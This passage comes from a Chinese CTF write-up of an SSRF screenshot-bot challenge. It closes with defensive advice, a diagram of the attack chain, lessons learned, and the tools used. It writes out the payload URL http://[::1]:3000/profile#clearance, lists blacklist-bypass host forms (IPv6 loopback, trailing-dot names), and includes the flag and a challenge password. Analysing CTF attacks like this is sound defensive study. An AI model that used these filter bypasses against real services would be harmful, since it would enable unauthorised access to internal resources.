| 为什么 `#clearance` 不会被服务器"丢掉" | 片段（`#` 后面部分）由浏览器处理，本来就不发给服务器；无人机是浏览器，它会用它 |
| 结果页里截图 uuid 怎么找 | 结果页 HTML 里搜 `/screenshots/`，正则 `([0-9a-f-]{36})` 即 uuid |

---

## 第九章：如何防御

这一章按攻击链上的每个环节给出防御建议。

### 9.1 防御清单

| 防御点 | 具体措施 |
|---|---|
| 地址过滤器（SSRF 入口） | 放弃字符串黑名单。流程：解析 URL → 取出主机名 → 解析为 IP（含 IPv6）→ 做 IP 归一化 → 只允许公网地址段（白名单）；解析出的 IP 与实际连接的 IP 必须一致（防 DNS 重绑定）；重定向逐跳重校验 |
| 主机形态归一化 | 对主机名先做规范化（去尾点、统一小写、IPv6 展开）再做判断，避免"字符串不同、实际同一台机器"的绕过 |
| 机器人会话 | 截图机器人**不携带任何特权登录态**；如业务必须登录，使用专用低权限账号，且每次任务重建浏览器上下文（不持久化 Cookie） |
| 权限最小化 | 不要把"机器人账号"设计成最高权限账号。本例里无人机的账号是 `OMEGA`（Chief Inspection Drone），直接形成了"机器人自带高权限"的致命组合 |
| 敏感区渲染 | 敏感内容的显示与否必须由**服务端按查看者身份**决定（本例服务端做了 REDACTED，问题只在"查看者=特权机器人"）；不要依赖"折叠线下""需要滚动"这类视觉遮挡 |
| 设计信息保护 | CSS/HTML 注释属于生产资源，会被直接读到。"snapshot fold""anchor jumps"这类注释等于把机制交底，设计文档不应带进线上资源 |
| 监控与告警 | 对扫描目标里出现 `[::1]`、`localhost.`、`[::ffff:127.0.0.1]` 等形态做日志与告警，此类形态在正常业务里几乎不会出现 |

### 9.2 一句话总结

本题的所有技术都在单一应用内，但真正的风险是**多个"单独看没毛病"的设计叠在一起**：黑名单过滤 + 机器人自带会话 + 会话绑定在某个可提交的主机形态 + 视口截图 + 锚点可控滚动。防御的关键不是堵某一个点，而是让这几件事**不能同时成立**（最省事的一刀：机器人不带特权会话）。

---

## 第十章：总结

最后一章用一张图回顾攻击链，给出三条可迁移的经验、工具链，以及两个留给读者的问题。

### 10.1 攻击链总览

```
①  [注册任意免费账号]  （BRONZE 等级，仅用于取得"提交扫描"的资格）
         │
         ▼
②  [提交扫描]  url = http://[::1]:3000/profile#clearance
         │            │             │
         │            │             └─ ③ #clearance 锚点：滚到机密区
         │            │                （截图是 800px 视口，不滚看不到）
         │            └─ ② 无人机自带 admin 会话
         │               且会话绑定 [::1] 主机形态
         └─ ① [::1]：IPv6 环回字面量，踩中地址过滤器的 IPv6 归一化缺口
         │
         ▼
③  [无人机以 admin（OMEGA）身份拍下自己的档案页]
         │
         ▼
④  [下载 /screenshots/<uuid>.png → Clearance Data 区读到 flag]
         │
         ▼
    sun{fr4gm3nt3d_r3fl3ct10ns_1n_th3_futur3}
```

三个要素各自都"不算漏洞"（IPv6 写法、机器人自己的会话、URL 锚点），但它们叠加在同一条链上时，形成了完整的攻击。

### 10.2 三条可迁移经验

1. **黑名单的边界要用"等价形态矩阵"摸清**。本次实测：数字编码变体（短写/十六进制/十进制/八进制）都被识破、主机名大小写不敏感，但尾点主机名、IPv6 字面量、127/8 段内其它地址被放过。逐个形态实测，不要假设"全拦"或"全漏"。
2. **Bot 题的变量表要包含"请求上下文"**。机器人持有什么身份、会话绑定在哪个主机形态、从什么网络位置访问，这些和"路径、参数、字段"同样是变量。本次解题的决定性实验就是"同一路径换主机形态"。
3. **先定义"终点需要什么"，再决定支线去留**。本题终点需要的是"高权限会话（无人机自己的）"，不是"凭据"；想清楚这一点，就能及时从第五章的凭据弯路上撤出。

### 10.3 工具链

| 工具 | 用途 |
|---|---|
| curl | 注册、登录、提交扫描、下载截图的 HTTP 操作 |
| Python + requests | 脚本化复现、结果页解析、截图轮询下载 |
| 侦察无人机（题目内置无头浏览器） | 带着自己的身份访问目标页并回传视口截图 |
| OCR 工具（glm-ocr 等） | 读取截图里的文字（flag 区） |
| 图像直读复核 | 与两次 OCR 组成三方交叉验证，防识别幻觉 |
| sha256sum | 校验"推导密码"与库中哈希一致（第五章弯路里的验证手段） |

### 10.4 两个留给读者的问题

1. 无人机的会话为什么绑定在 `[::1]` 这个形态上？我们只从行为上证明了"它绑在那里"（三种主机形态对照，可复现），并没有直接观测其成因；合理的推断是机器人自己的登录动作经由 IPv6 环回访问应用。另有一个未查清的细节：同一个 `[::1]` 目标，直接提交会带会话、经外部重定向包装提交则不带（在存活实例上稳定可复现，成因未明）。不影响解法成立，有兴趣可以从"机器人本身的部署脚本"角度继续挖。
2. 第五章那个"真密码"（`GR$*#sunshinectf8_`）属于哪道兄弟题、应该在哪里使用？它是本题赛场环境里的"跨题资产"，超出本题范围；留给有兴趣的读者。

> **最终一句话**：让机器人用**它自己的身份**，去看**它自己**的机密档案；地址过滤器用 IPv6 环回字面量绕过，机密区用 URL 锚点拉进截图。三行 URL，一个 flag。
